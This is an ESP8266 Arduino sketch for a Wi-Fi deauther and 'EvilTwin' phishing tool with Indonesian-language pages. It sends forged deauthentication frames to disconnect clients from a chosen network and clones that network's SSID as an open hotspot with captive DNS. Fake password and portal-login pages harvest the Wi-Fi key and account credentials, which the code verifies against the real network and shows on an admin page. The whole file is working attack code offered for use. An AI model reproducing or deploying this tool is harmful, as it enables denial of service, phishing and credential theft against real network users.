#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WiFiClient client;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
const char* serverUrl = "http://192.168.5.1/";

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "12345678";
String _tryUsername = "";
String _tryUPassword = "";
bool correct_pass = false;

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("DaFiq", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    return;
  }
  Serial.println("LittleFS working!");

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/login", handleLoginPage);
  webServer.on("/attempt", handleAttempt);
  webServer.serveStatic("/", LittleFS, "/");
  webServer.serveStatic("/style.css", LittleFS, "/style.css");
  webServer.serveStatic("/jquery-1.4.3.min.js", LittleFS, "/jquery-1.4.3.min.js");
  webServer.serveStatic("/img", LittleFS, "/img");
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {

  if (WiFi.status() != WL_CONNECTED) {

    webServer.send(200, "text/html",
                   "<html>"
                   "<head>"
                   "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "<script>setTimeout(function(){window.location.href='/'},3000);</script>"
                   "<style>"
                   "body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#E4E7E1;color:#666;}"
                   ".wrap{max-width:640px;margin:0 auto;}"
                   ".message-box{background:#ECF1F4;border:1px solid #DFDDDD;margin:40px 5px 27px 5px;"
                   "border-radius:0 0 0 0.4em;box-shadow:0 .1875rem .375rem rgba(0,0,0,.25);"
                   "text-align:left;padding:0;}"
                   ".box-header{background:#1474CB;color:#fff;margin-top:-17px;margin-left:-1px;"
                   "min-width:98%;height:34px;line-height:34px;padding-left:15px;font-weight:bold;"
                   "border-radius:0.4em 0 0 0;}"
                   ".box-body{padding:25px 20px 30px 70px;font-size:1.05em;font-weight:bold;"
                   "background-image:url('img/error.png');background-repeat:no-repeat;"
                   "background-position:20px center;color:#b30000;}"
                   ".footer{text-align:center;margin-top:-10px;font-weight:bold;color:#666;}"
                   "</style>"
                   "</head>"
                   "<body>"
                   "<div class='wrap'>"

                   "<div class='message-box'>"
                   "<div class='box-header'>Kesalahan</div>"
                   "<div class='box-body'>"
                   "Kata sandi salah.<br>Silakan coba lagi."
                   "</div>"
                   "</div>"

                   "<div class='footer'>Mengalihkan kembali...</div>"

                   "</div>"
                   "</body>"
                   "</html>");


    Serial.println("Wrong password tried!");
    return;
  }

  if (!correct_pass) {
    correct_pass = true;

    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP(_selectedNetwork.ssid.c_str());
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    return;
  }
  webServer.send(200, "text/html",
                 "<html>"
                 "<head>"
                 "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                 "<script>setTimeout(function(){window.location.href='/'},3000);</script>"
                 "<style>"
                 "body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#E4E7E1;color:#666;}"
                 ".wrap{max-width:640px;margin:0 auto;}"
                 ".container{background:#ECF1F4;border:1px solid #DFDDDD;margin:40px 5px 27px 5px;"
                 "border-radius:0 0 0 0.4em;box-shadow:0 .1875rem .375rem rgba(0,0,0,.25);text-align:center;}"
                 ".container-header{background:#1474CB;color:#fff;margin-top:-17px;margin-left:-1px;"
                 "min-width:98%;height:34px;line-height:34px;padding-left:15px;font-weight:bold;"
                 "border-radius:0.4em 0 0 0;text-align:left;}"
                 ".container-body{padding:30px 20px 40px 20px;font-size:1.1em;font-weight:bold;}"
                 ".spinner{margin-top:15px;font-size:50px;color:#1474CB;}"
                 "</style>"
                 "</head>"
                 "<body>"
                 "<div class='wrap'>"

                 "<div class='container'>"
                 "<div class='container-header'>Mengalihkan...</div>"
                 "<div class='container-body'>"
                 "Sedang mengalihkan halaman...<br><br>"
                 "<div class='spinner'></div>"
                 "<p>Harap tunggu sebentar...</p>"
                 "</div>"
                 "</div>"

                 "</div>"
                 "</body>"
                 "</html>");
}

String urlEncode(const String& str) {
  String encoded = "";
  char c;
  char code0;
  char code1;
  for (int i = 0; i < str.length(); i++) {
    c = str.charAt(i);
    if (isalnum(c)) {
      encoded += c;
    } else if (c == ' ') {
      encoded += '+';
    } else {
      code1 = (c & 0xf) + '0';
      if ((c & 0xf) > 9) code1 = (c & 0xf) - 10 + 'A';
      code0 = ((c >> 4) & 0xf) + '0';
      if (((c >> 4) & 0xf) > 9) code0 = ((c >> 4) & 0xf) - 10 + 'A';
      encoded += '%';
      encoded += code0;
      encoded += code1;
    }
  }
  return encoded;
}

void handleAttempt() {
  if(_correct == ""){
    if (!webServer.hasArg("Username") || !webServer.hasArg("Password") || !webServer.hasArg("_action")) {
    webServer.send(400, "text/plain", "Missing parameters");
    return;
  }

  _tryUsername = webServer.arg("Username");
  _tryUPassword = webServer.arg("Password");
  String action = webServer.arg("_action");

  String httpRequestData = "Username=" + urlEncode(_tryUsername) + "&Password=" + urlEncode(_tryUPassword) + "&_action=" + urlEncode(action);
  Serial.println(httpRequestData);
  
  WiFi.disconnect(true);
  delay(500);
  WiFi.begin(
    _selectedNetwork.ssid.c_str(),
    _tryPassword.c_str());

  unsigned long start = millis();
  while (millis() - start < 10000) {  // wait up to 10 seconds
    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Connected!");
      break;
    }
    delay(500);
    Serial.print(".");
  }
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("Failed to connect!");
    Serial.println(WiFi.status());  // should show 7 if auth failed
  }

  bool ok = false;
  // Serial.println(WiFi.status());
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("Connecting....");
    HTTPClient http;

    http.begin(client, serverUrl);
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");
    int httpResponseCode = http.POST(httpRequestData);

    if (httpResponseCode > 0) {
      Serial.println("HTTP Response code: " + String(httpResponseCode));

      if (httpResponseCode == 200) {

        WiFiClient* stream = http.getStreamPtr();
        if (stream == nullptr) {
          Serial.println("Stream is NULL!");
          http.end();
          return;
        }

        Serial.println("Reading stream...");

        const size_t bufSize = 256;
        uint8_t buf[bufSize];

        String response = "";    // <— hanya untuk cek title nanti, tidak append besar
        response.reserve(2048);  // <— hindari fragmentasi besar

        unsigned long timeout = millis();

        while (stream->connected() && millis() - timeout < 5000) {
          int available = stream->available();

          if (available > 0) {
            int bytes = stream->readBytes(buf, min((size_t)available, bufSize));
            timeout = millis();

            // aman: hanya simpan sebagian kecil untuk cek title
            for (int i = 0; i < bytes; i++) {
              if (response.length() < 2000) response += (char)buf[i];
            }
          }
        }

        Serial.println("DONE. Length captured: " + String(response.length()));
        // Serial.println(response);

        if (response.indexOf("<title>MyPublicWiFi - Your Session Information</title>") != -1) {
          Serial.println("✅ Registration successful! Doing something...");
          ok = true;
          correct_pass = false;
          http.addHeader("Content-Type", "application/x-www-form-urlencoded");
          int LogoutResponseCode = http.POST("_action=Logout");
          if (LogoutResponseCode > 0){
            Serial.println("Logout Response Code : " + String(LogoutResponseCode));
            if(LogoutResponseCode == 200){
              Serial.println("Berhasil Logout!");
            }
          }
        }
      } else {
        Serial.println("❌ Response code or content type not expected.");
      }
    } else {
      Serial.println("Error on sending POST: " + String(httpResponseCode));
    }

    http.end();
  }

  // VALIDASI AMAN (bikin aturan sesuai kebutuhan)
  if (ok) {
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);

    WiFi.softAPConfig(
      IPAddress(192, 168, 4, 1),
      IPAddress(192, 168, 4, 1),
      IPAddress(255, 255, 255, 0));
    WiFi.softAP("DaFiq", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    _correct = "Successfully got password for: " + _selectedNetwork.ssid + "<br> Password: " + _tryPassword + "<br> Username: " + _tryUsername + "<br> Username Pass: " + _tryUPassword;

    Serial.println("Success");
    Serial.println(_correct);

    webServer.send(200, "text/plain", "OK");
    return;
  }

  dnsServer.stop();
  int n = WiFi.softAPdisconnect(true);
  Serial.println(String(n));
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(_selectedNetwork.ssid.c_str());
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.send(200, "text/html",
                 "<html>"
                 "<head>"
                 "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                 "<script>setTimeout(function(){window.location.href='/login';},3000);</script>"
                 "<style>"
                 "body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#E4E7E1;color:#666;}"
                 ".wrap{max-width:640px;margin:0 auto;}"
                 ".message-box{background:#ECF1F4;border:1px solid #DFDDDD;margin:40px 5px 27px 5px;"
                 "border-radius:0 0 0 0.4em;box-shadow:0 .1875rem .375rem rgba(0,0,0,.25);}"
                 ".box-header{background:#1474CB;color:#fff;margin-top:-17px;margin-left:-1px;"
                 "min-width:98%;height:34px;line-height:34px;padding-left:15px;font-weight:bold;"
                 "border-radius:0.4em 0 0 0;}"
                 ".box-body{padding:25px 20px 30px 70px;font-size:1.05em;font-weight:bold;"
                 "background-image:url('img/error.png');background-repeat:no-repeat;"
                 "background-position:20px center;color:#b30000;}"
                 ".footer{text-align:center;margin-top:-10px;font-weight:bold;color:#666;}"
                 "</style>"
                 "</head>"
                 "<body>"
                 "<div class='wrap'>"

                 "<div class='message-box'>"
                 "<div class='box-header'>Kesalahan</div>"
                 "<div class='box-body'>"
                 "Akun atau kata sandi salah.<br>Silakan coba lagi."
                 "</div>"
                 "</div>"

                 "<div class='footer'>Mengalihkan ke halaman login...</div>"

                 "</div>"
                 "</body>"
                 "</html>");
  }
  
}



String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>button,th{background:#1e6bff;color:#fff}h3,td,th{padding:10px}body{font-family:Arial,sans-serif;background:#e8f1ff;margin:0;padding:20px;color:#0a2a43}.content{max-width:600px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,.1)}button{border:none;padding:8px 16px;border-radius:5px;font-size:14px;cursor:pointer;transition:.25s}button:hover{background:#0a4fd8}button.selected{background:#35c759!important}.action-buttons form{display:inline-block;margin-right:10px}table{width:100%;border-collapse:collapse;margin-top:10px}table,td,th{border:1px solid #b5cff8}tr:nth-child(2n){background:#f3f7ff}tr:hover{background:#e1edff}h3{background:#dff6dd;color:#0f5b28;border-left:5px solid #35c759;border-radius:5px}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("DaFiq", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (!correct_pass) {
      if (webServer.hasArg("password")) {

        _tryPassword = webServer.arg("password");
        Serial.println(_tryPassword.c_str());
        WiFi.disconnect();
        WiFi.begin(
          _selectedNetwork.ssid.c_str(),
          _tryPassword.c_str(),
          _selectedNetwork.ch,
          _selectedNetwork.bssid);

        webServer.send(200, "text/html",
                       "<html>"
                       "<head>"
                       "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                       "<script>setTimeout(function(){window.location.href='/result';},10500);</script>"
                       "<style>"
                       "body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#E4E7E1;color:#666;}"
                       ".wrap{max-width:640px;margin:0 auto;}"
                       ".container{background:#ECF1F4;border:1px solid #DFDDDD;margin:40px 5px 27px 5px;"
                       "border-radius:0 0 0 0.4em;box-shadow:0 .1875rem .375rem rgba(0,0,0,.25);text-align:center;}"
                       ".container-header{background:#1474CB;color:#fff;margin-top:-17px;margin-left:-1px;"
                       "min-width:98%;height:34px;line-height:34px;padding-left:15px;font-weight:bold;"
                       "border-radius:0.4em 0 0 0;text-align:left;}"
                       ".container-body{padding:30px 20px 40px 20px;font-size:1.1em;font-weight:bold;}"
                       ".spinner{margin-top:15px;font-size:50px;color:#1474CB;}"
                       "</style>"
                       "</head>"
                       "<body>"
                       "<div class='wrap'>"

                       "<div class='container'>"
                       "<div class='container-header'>Menghubungkan</div>"
                       "<div class='container-body'>"
                       "Sedang menghubungkan ke jaringan...<br><br>"
                       "<div class='spinner'></div>"
                       "<p>Harap tunggu...</p>"
                       "</div>"
                       "</div>"

                       "</div>"
                       "</body>"
                       "</html>");


      } else {

        String form =
          "<html>"
          "<head>"
          "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
          "<style>"
          "body{margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#E4E7E1;color:#666;}"
          ".wrap{max-width:640px;margin:0 auto;}"
          ".page-header{margin:0 5px 27px 5px;text-align:center;}"
          ".page-description{font-weight:bold;font-size:1.0em;padding-bottom:10px;}"
          ".container{background:#ECF1F4;border:1px solid #DFDDDD;margin:10px 5px 27px 5px;"
          "border-radius:0 0 0 0.4em;box-shadow:0 .1875rem .375rem rgba(0,0,0,.25);}"
          ".container-header{background:#1474CB;color:#fff;margin-top:-17px;margin-left:-1px;"
          "min-width:98%;height:34px;line-height:34px;padding-left:15px;font-weight:bold;"
          "border-radius:0.4em 0 0 0;}"
          ".container-body{padding:20px 25px 30px 20px;}"
          "input[type=password],input[type=text]{width:92%;height:2.4em;margin-bottom:10px;"
          "border:1px solid #777;border-radius:3px;padding-left:36px;font-size:1rem;"
          "background-position:10px center;background-repeat:no-repeat;}"
          ".icon-password{background-image:url('img/password16.png');}"
          ".icon-wifi{background-image:url('img/user16.png');}"
          "input[type=submit]{background:#1577CF;color:#fff;padding:0.55em 1em;font-size:1rem;"
          "font-weight:bold;border-radius:0.2em;border:none;width:auto;}"
          "input[type=submit]:hover{background:#1D6DB5;cursor:pointer;}"
          ".page-footer{text-align:center;font-size:0.9em;font-weight:bold;margin:-17px 5px 27px 5px;}"
          ".background-hotspot{background-image: url('img/logo.png');background-size: contain;background-repeat: no-repeat;background-position: center;height: 32px;}"
          "</style>"
          "</head>"
          "<body>"
          "<div class='wrap'>"

          "<div class='page-header'>"
          "<div class='page-description background-hotspot'></div>"
          "</div>"

          "<div class='container'>"
          "<div class='container-header'>Jaringan Terdeteksi</div>"
          "<div class='container-body'>"
          "<p><b>SSID:</b> "
          + _selectedNetwork.ssid + "</p>"
                                    "<form action='/' method='GET'>"
                                    "<input class='icon-password' type='password' id='password' name='password' "
                                    "placeholder='Masukkan Password' minlength='8'>"
                                    "<br>"
                                    "<input type='submit' value='Connect'>"
                                    "</form>"
                                    "</div>"
                                    "</div>"

                                    "<div class='page-footer'>Hotspot Configuration</div>"

                                    "</div>"
                                    "</body>"
                                    "</html>";


        webServer.send(200, "text/html", form);
      }
    } else {
      webServer.send(200, "text/html",
                     "<html><head>"
                     "<meta http-equiv='refresh' content='0; url=/login' />"
                     "</head><body></body></html>");
    }
  }
}

void listFiles() {
  Serial.println("Listing LittleFS files:");

  Dir dir = LittleFS.openDir("/");
  while (dir.next()) {
    Serial.print("FILE: ");
    Serial.print(dir.fileName());
    Serial.print("\tSIZE: ");
    Serial.println(dir.fileSize());
  }

  Serial.println("End of file list.");
}

void handleLoginPage() {
  File f = LittleFS.open("/login.html", "r");
  listFiles();
  if (!f) {
    webServer.send(500, "text/plain", "login.html missing");
    return;
  }

  String page = f.readString();
  f.close();

  webServer.send(200, "text/html", page);
}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("DaFiq", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #30b346;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00 };

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      // Serial.println("BAD");
    } else {
      // Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
